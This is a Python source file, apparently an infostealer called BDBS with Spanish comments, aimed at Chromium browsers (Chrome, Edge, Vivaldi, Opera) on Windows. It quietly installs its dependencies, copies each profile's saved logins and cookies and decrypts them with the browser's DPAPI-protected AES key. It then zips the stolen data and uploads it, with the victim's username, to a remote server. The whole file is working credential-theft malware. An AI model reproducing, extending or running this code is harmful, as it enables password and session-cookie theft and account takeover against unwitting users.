import os, sys, subprocess, time
import json, sqlite3
import shutil
import base64
from time import gmtime, strftime
from enum import Enum

try:
    import requests
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'], stdout=subprocess.DEVNULL)
        import requests
    except:
        sys.exit()
try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'pycryptodome'], stdout=subprocess.DEVNULL)
        from Crypto.Cipher import AES
    except:
        sys.exit()
try:
    import win32crypt
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'pypiwin32'], stdout=subprocess.DEVNULL)
        import win32crypt
    except:
        sys.exit()

class BDBS:
    # Propiedades
    WORKSPACE = str(f"{os.path.expanduser('~')}\\AppData\\Local\\Temp\\BDBS")
    POST_URI = None

    # Constructor
    def __init__(self, post_uri):
        self.POST_URI = post_uri
        # create WORKSPACE folder if not exists
        if not os.path.isdir(self.WORKSPACE):
            os.makedirs(self.WORKSPACE)
        print("BDBS Instance created!")

    # Variables
    isFirstLog = True

    # Metodos
    def postToServer(self, filePath, CHROMIUM_CORE)->bool:
        try:
            with open(filePath, 'rb') as f:
                self.AddToLog("Uploading zip file to server...")
                print(requests.post(
                    self.POST_URI,
                    files={
                        "file": f
                    },
                    data={
                        "user": os.getlogin(),
                        "browser": CHROMIUM_CORE[2]
                    }).text
                )
                self.AddToLog("File upload successfully!")
                return True
        except:
            self.AddToLog("Error: Can't send the file.", True)
            return False
    
    def AddToLog(self, content, isError = False)->str: # mantiene un registro de lo que pasa
        log = str("{}{} {}".format("[!] " if isError else "", time.strftime("%H:%M:%S %d/%m", time.localtime()), content))
        print(log)
        with open(str("{}\\BDBS.log".format(self.WORKSPACE)), "a") as logs:
            if self.isFirstLog:
                logs.write(str("\n\n\n"))
                self.isFirstLog = False
            logs.write(str(f"{log}\n"))
        return log
    
    def getCurrentUserFolder(self)->str:
        return os.path.expanduser('~')
    
    def createStructureFile(self, kitchen, CHROMIUM_CORE, ChromiumPath):
        try:
            # EL ARCHIVO DE ESTRUCTURA ES MAS PARA EL PANEL DE CONTROL.
            # REALMENTE, NO ES NECESARIO, PERO EN UN FUTURO TENGO PLANEADA UNA UPDATE PARA EL PANEL.
            # POR AHORA, LO METEMOS
            # INFORMACION IMPORTANTE SOBRE LA INSTANCIA
            self.AddToLog("Creating report...")
            datos = {
                "UserName": os.getlogin(),
                "ScriptDirectory": os.path.dirname(os.path.realpath(__file__)),
                "WorkingDirectory": self.WORKSPACE,
                "StaggingDirectory": kitchen,
                "TimeAndDate": strftime("%d-%m-%Y %H:%M:%S", gmtime()),
                "WebBrowser": {
                    "Author": CHROMIUM_CORE[1],
                    "Name": CHROMIUM_CORE[2],
                    "InstallDirectory": ChromiumPath
                }
            }
            # GUARDA LOS DATOS EN UN JSON
            with open(self.WORKSPACE+'\\structure.json', 'w', encoding='utf-8') as f:
                json.dump(datos, f, ensure_ascii=False, indent=4)
        except Exception as ex:
            self.AddToLog("Error: '{}'.".format(ex), True)

class BDBS_Crypto:
    def __init__(self):
        print("BDBS-Crypto Instance created!")
    
    def getCryptoKey(self, LocalStateFile)->str | None:
        jsonContent = None
        CryptoKey = None
        try:
            # LEEMOS EL ARCHIVO Local State Y LO CONVERTIMOS A JSON
            with open(LocalStateFile, 'r') as file:
                jsonContent = json.loads(file.read())
        except:
            return CryptoKey
        try:
            # OBTENEMOS LA LLAVE DE CIFRADO.
            CryptoKey = base64.b64decode(jsonContent['os_crypt']['encrypted_key'])[5:]
            CryptoKey = win32crypt.CryptUnprotectData(CryptoKey, None, None, None, 0)[1]
        except:
            CryptoKey = None
        return CryptoKey

    def getDecrytpedValue(self, value, CryptoKey)->str | None:
        try:
            iv = value[3:15]
            value = value[15:]
            cipher = AES.new(CryptoKey, AES.MODE_GCM, iv)
            return cipher.decrypt(value)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(value, None, None, None, 0)[1])
            except:
                return None

    def getDecryptedCookies(self, CryptoKey, workspace):
        try:
            cookiesFiles = []
            # BUSCA TODOS LOS ARCHIVOS Cookies QUE EXISTAN DENTRO DE LA CARPETA TEMPORAL
            for root, dir, files in os.walk(workspace):
                if "Cookies" in files:
                    cookiesFiles.append(os.path.join(root, "Cookies"))
            # POR CADA ARCHIVO Cookies EN EL DIRECTORIO TEMPORAL:
            for cookie in cookiesFiles:
                # CREA UNA CONEXION PARA CONECTARSE A LA BASE DE DATOS
                conn = sqlite3.connect(cookie)
                # TRABAJAMOS EN BYTES, PARA LOS VALORES ENCRIPTADOS
                conn.text_factory = bytes
                # CREAMOS UN CURSOR PARA NAVEGAR
                cursor = conn.cursor()
                # CREAMOS UNA TABLA cocked PARA ALMACENAR LOS VALORES QUE DESCIFREMOS
                cursor.execute("CREATE TABLE IF NOT EXISTS cocked (host_key TEXT, name TEXT, decrypted_value TEXT)")
                # SELECCIONA COLUMNAS DE LA TABLA cookies
                cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
                # POR CADA FILA DEVUELTA:
                for host_key, name, encrypted_value in cursor.fetchall():
                    # OBTENEMOS EL DOMINIO DE LA COOKIE
                    host_key = host_key.decode('utf-8')
                    # OBTENEMOS EL NOMBRE DE LA COOKIE
                    name = name.decode('utf-8')
                    # DESCIFRAMOS EL VALOR DE LA COOKIE
                    value = self.getDecrytpedValue(encrypted_value, CryptoKey)
                    # GUARDAMOS EL VALOR DE LA COOKIE DESCIFRADA EN cooked.
                    cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (host_key, name, value))
                conn.commit() # APLICAMOS CAMBIOS
                conn.close() # SERRAMOS ESA CONEXION
        except Exception as ex:
            print("Error: '{}'.".format(ex))
    
    def getDecryptedSignings(self, CryptoKey, workspace):
        try:
            signinFiles = []
            for root, dir, files in os.walk(workspace):
                if "Login Data" in files:
                    signinFiles.append(os.path.join(root, "Login Data"))
            for signin in signinFiles:
                conn = sqlite3.connect(signin)
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute("CREATE TABLE IF NOT EXISTS cocked (url TEXT, username TEXT, password TEXT)")
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for origin_url, username_value, password_value in cursor.fetchall():
                    origin_url = origin_url.decode('utf-8')
                    valuePassword = self.getDecrytpedValue(password_value, CryptoKey)
                    cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (origin_url, username_value, valuePassword))
                conn.commit()
                conn.close()
        except Exception as ex:
            print("Error: '{}'.".format(ex))

class Chromium(Enum):
    GOOGLE_CHROME = ["Local\\Google\\Chrome", "Google", "Chrome"]
    MICROSOFT_EDGE = ["Local\\Microsoft\\Edge", "Microsoft", "Edge"]
    VIVALDI = ["Local\\Vivaldi", "Vivaldi Technologies", "Vivaldi"]
    OPERA = ["Roaming\\Opera Software\\Opera Stable", "Opera Software", "Opera"]

class BDBS_Chromium(BDBS, BDBS_Crypto):
    # Propiedades
    CHROMIUM_CORE = None

    # Constructor
    def __init__(self, post_uri, chromium_core):
        BDBS.__init__(self, post_uri)
        if type(chromium_core) is Chromium:
            self.CHROMIUM_CORE = chromium_core.value
        else:
            self.CHROMIUM_CORE = chromium_core
        print("BDBS-Chromium Instance created!")

    # Variables

    # Metodos
    def getChromiumProfiles(self, LocalStateFile)->list | None:
        try:
            self.AddToLog("Getting chromium profiles from web browser...")
            # ABRIMOS EL ARCHIVO Local State QUE CONTIENE LOS PERFILES
            f = open(LocalStateFile)
            data = json.load(f)
            retorno = []
            for i in data['profile']['info_cache']:
                retorno.append(i)
            f.close()
            # DEVOLVEMOS LA LISTA DE PERFILES DISPONIBLES
            return retorno
        except:
            print("Error: Chromium '{}' profile not found.".format(self.CHROMIUM_CORE[2]))
            return None
    
    def createStaggingWorkspace(self)->str | None:
        try:
            self.AddToLog("Creating workspaces...")
            # PARA LIMPIAR LA CARPETA TEMPORAL DE TRABAJO, PARA EVITAR COPIAS ANTERIORES
            if os.path.exists(str(f"{self.WORKSPACE}\\{self.CHROMIUM_CORE[2]}")):
                shutil.rmtree(str(f"{self.WORKSPACE}\\{self.CHROMIUM_CORE[2]}"))
            # CREAMOS LA CARPETA TEMPORAL SI ESTA NO EXISTE
            if not os.path.exists(self.WORKSPACE):
                os.mkdir(self.WORKSPACE)
            # CREAMOS LA CARPETA TEMPORAL PARA EL NAVEGADOR
            if not os.path.exists(str(f"{self.WORKSPACE}\\{self.CHROMIUM_CORE[2]}")):
                os.mkdir(str(f"{self.WORKSPACE}\\{self.CHROMIUM_CORE[2]}"))
            return str(f"{self.WORKSPACE}\\{self.CHROMIUM_CORE[2]}")
        except Exception as ex:
            self.AddToLog("Error: '{}'.".format(ex), True)
            return None

    def copyBrowserDataToStaggingWorkspace(self, ChromiumPath, LocalStateFile)->list | None:
        try:
            TempDirectory = self.createStaggingWorkspace()
            ChromiumProfiles = self.getChromiumProfiles(LocalStateFile)
            self.AddToLog("Copying files to workspace...")
            # COPIAMOS EL ARCHIVO Local State A NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
            shutil.copyfile(LocalStateFile, str(f"{TempDirectory}\\Local State"))
            # POR CADA PERFIL EXISTENTE:
            for profile in ChromiumProfiles:
                self.AddToLog("    Copying '{}' profile to workspace...".format(profile))
                # DEFINIMOS EL DIRECTORIO TEMPORAL PARA EL PERFIL
                profileTempPath = str(f"{TempDirectory}\\{profile}")
                # OBTENEMOS EL DIRECTORIO DEL PERFIL
                ChromiumProfilePath = str("{}{}\\".format(ChromiumPath, profile))
                # CREA LA CARPETA DEL PERFIL EN NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
                if not os.path.exists(str(f"{profileTempPath}")):
                    os.mkdir(str(f"{profileTempPath}"))
                # COPIA Login Data y Cookies EN EL DIRECTORIO TEMPORAL
                shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "Login Data")), str(f"{profileTempPath}\\Login Data"))
                shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "\\Network\\Cookies")), str(f"{profileTempPath}\\Cookies"))
            return [TempDirectory+"\\", ChromiumProfiles]
        except Exception as ex:
            self.AddToLog("Error: '{}'.".format(ex), True)
            return None

    def stoleChromium(self):
        try:
            self.AddToLog("Stole process started!")
            # DEFINIMOS LA CARPETA DONDE ESTAN LOS DATOS DEL USUARIO
            ChromiumPath = str("{}\\AppData\\{}\\User Data\\".format(self.getCurrentUserFolder(), self.CHROMIUM_CORE[0]))
            LocalStateFile = str("{}Local State".format(ChromiumPath))
            # CREAMOS EL DIRECTORIO TEMPORAL
            copiedInfo = self.copyBrowserDataToStaggingWorkspace(ChromiumPath, LocalStateFile)
            # DESCIFRAMOS LAS COOKIES
            self.AddToLog("Reading cryptographic key...")
            CryptoKey = self.getCryptoKey(LocalStateFile)
            # DESCIFRAMOS LAS COOKIES
            self.AddToLog("    Decrypting cookies...")
            self.getDecryptedCookies(CryptoKey, copiedInfo[0])
            # DESCIFRAMOS LOS INICIOS DE SESION GUARDADOS DEL AUTO-COMPLETADO
            self.AddToLog("    Decrypting logins...")
            self.getDecryptedSignings(CryptoKey, copiedInfo[0])
            # CREAMOS EL ARCHIVO DE ESTRUCTURA PARA EL PANEL
            self.createStructureFile(copiedInfo[0], self.CHROMIUM_CORE, ChromiumPath)
            # DEFINIMOS EL ZIP CON LAS COOKIES A ENVIAR
            self.AddToLog("Creating zip file...")
            zipfilePath = str('{}\\{}-{}'.format(self.WORKSPACE, os.getlogin(), self.CHROMIUM_CORE[2]))
            # CREAMOS EL ZIP
            shutil.make_archive(zipfilePath, 'zip', self.WORKSPACE) # crea un zip dentro de otro :/
            # ENVIAMOS EL ZIP AL SERVIDOR
            return self.postToServer(zipfilePath+".zip", self.CHROMIUM_CORE[2])
        except Exception as ex:
            self.AddToLog("Error: {}".format(ex), True)
            return False
